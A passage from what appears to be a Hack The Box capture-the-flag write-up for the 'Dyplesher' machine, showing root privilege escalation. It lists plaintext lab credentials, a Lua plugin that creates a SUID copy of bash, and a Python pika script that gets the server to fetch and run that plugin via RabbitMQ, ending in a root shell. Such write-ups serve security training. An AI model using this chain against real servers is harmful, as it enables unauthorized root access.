+<p>The pcap file contains some AMQP messages with additional credentials:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">felamos  / tieb0graQueg</code></li>
+  <li><code class="language-plaintext highlighter-rouge">yuntao   / wagthAw4ob</code></li>
+  <li><code class="language-plaintext highlighter-rouge">MinatoTW / bihys1amFov</code></li>
+</ul>
+
+<p><img src="/assets/images/htb-writeup-dyplesher/image-20200524114757641.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-writeup-dyplesher/image-20200524114949910.png" alt="" /></p>
+
+<h2 id="root-privesc">Root privesc</h2>
+
+<p>The send.sh file contains a hint about what we need to do next:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>felamos@dyplesher:~$ ls
+cache  snap  user.txt  yuntao
+felamos@dyplesher:~$ ls yuntao/
+send.sh
+felamos@dyplesher:~$ cat yuntao/send.sh 
+#!/bin/bash
+
+echo 'Hey yuntao, Please publish all cuberite plugins created by players on plugin_data "Exchange" and "Queue". Just send url to download plugins and our new code will review it and working plugins will be added to the server.' &gt;  /dev/pts/{}
+</code></pre></div></div>
+
+<p>Cubberite plugins are basically just lua scripts so we can created a simple script that’ll copy and make bash suid, then host that script locally with a local webserver.</p>
+
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">os.execute</span><span class="p">(</span><span class="s2">"cp /bin/bash /tmp/snow"</span><span class="p">)</span>
+<span class="nb">os.execute</span><span class="p">(</span><span class="s2">"chmod 4777 /tmp/snow"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>We’ll reconnect to the box and port forward port 5672 so we can use the Pika Python library and publish messages to the RabbitMQ messaging bus: <code class="language-plaintext highlighter-rouge">ssh -L 5672:127.0.0.1:5672 felamos@10.10.10.190</code></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+</span>
+<span class="kn">import</span> <span class="nn">pika</span>
+
+<span class="n">credentials</span> <span class="o">=</span> <span class="n">pika</span><span class="p">.</span><span class="n">PlainCredentials</span><span class="p">(</span><span class="s">'yuntao'</span><span class="p">,</span> <span class="s">'EashAnicOc3Op'</span><span class="p">)</span>
+<span class="n">parameters</span> <span class="o">=</span> <span class="n">pika</span><span class="p">.</span><span class="n">ConnectionParameters</span><span class="p">(</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="mi">5672</span><span class="p">,</span> <span class="n">credentials</span><span class="o">=</span><span class="n">credentials</span><span class="p">)</span>
+<span class="n">connection</span> <span class="o">=</span> <span class="n">pika</span><span class="p">.</span><span class="n">BlockingConnection</span><span class="p">(</span><span class="n">parameters</span><span class="p">)</span>
+
+<span class="n">channel</span> <span class="o">=</span> <span class="n">connection</span><span class="p">.</span><span class="n">channel</span><span class="p">()</span>
+
+<span class="n">channel</span><span class="p">.</span><span class="n">exchange_declare</span><span class="p">(</span><span class="n">exchange</span><span class="o">=</span><span class="s">'plugin_data'</span><span class="p">,</span> <span class="n">durable</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">channel</span><span class="p">.</span><span class="n">queue_declare</span><span class="p">(</span><span class="n">queue</span><span class="o">=</span><span class="s">'plugin_data'</span><span class="p">,</span> <span class="n">durable</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">channel</span><span class="p">.</span><span class="n">queue_bind</span><span class="p">(</span><span class="n">queue</span><span class="o">=</span><span class="s">'plugin_data'</span><span class="p">,</span> <span class="n">exchange</span><span class="o">=</span><span class="s">'plugin_data'</span><span class="p">,</span> <span class="n">routing_key</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">arguments</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>
+<span class="n">channel</span><span class="p">.</span><span class="n">basic_publish</span><span class="p">(</span><span class="n">exchange</span><span class="o">=</span><span class="s">'plugin_data'</span><span class="p">,</span> <span class="n">routing_key</span><span class="o">=</span><span class="s">"plugin_data"</span><span class="p">,</span> <span class="n">body</span><span class="o">=</span><span class="s">'http://127.0.0.1:8080/pwn.lua'</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"Message sent, check the webserver to see if the LUA script was fetched."</span><span class="p">)</span>
+<span class="n">connection</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snowscan@kali:~/htb/dyplesher$ python3 exploit.py 
+Message sent, check the webserver to see if the LUA script was fetched.
+
+felamos@dyplesher:~$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+127.0.0.1 - - [24/May/2020 15:57:29] "GET /pwn.lua HTTP/1.0" 200 -
+</code></pre></div></div>
+
+<p>After a few moments, the LUA script is executed and we have a SUID bash we can use to get root.</p>
+
+<p><img src="/assets/images/htb-writeup-dyplesher/image-20200524115627328.png" alt="" /></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#amqp" class="page__taxonomy-item" rel="tag">amqp</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#capabilities" class="page__taxonomy-item" rel="tag">capabilities</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#gogs" class="page__taxonomy-item" rel="tag">gogs</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#lua" class="page__taxonomy-item" rel="tag">lua</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#memcache" class="page__taxonomy-item" rel="tag">memcache</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#minecraft" class="page__taxonomy-item" rel="tag">minecraft</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pcap" class="page__taxonomy-item" rel="tag">pcap</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#rabbitmq" class="page__taxonomy-item" rel="tag">rabbitmq</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#sqlite" class="page__taxonomy-item" rel="tag">sqlite</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#vhosts" class="page__taxonomy-item" rel="tag">vhosts</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-10-24T00:00:00+02:00">October 24, 2020</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-blunder/" class="pagination--pager" title="Blunder - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-fuse/" class="pagination--pager" title="Fuse - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
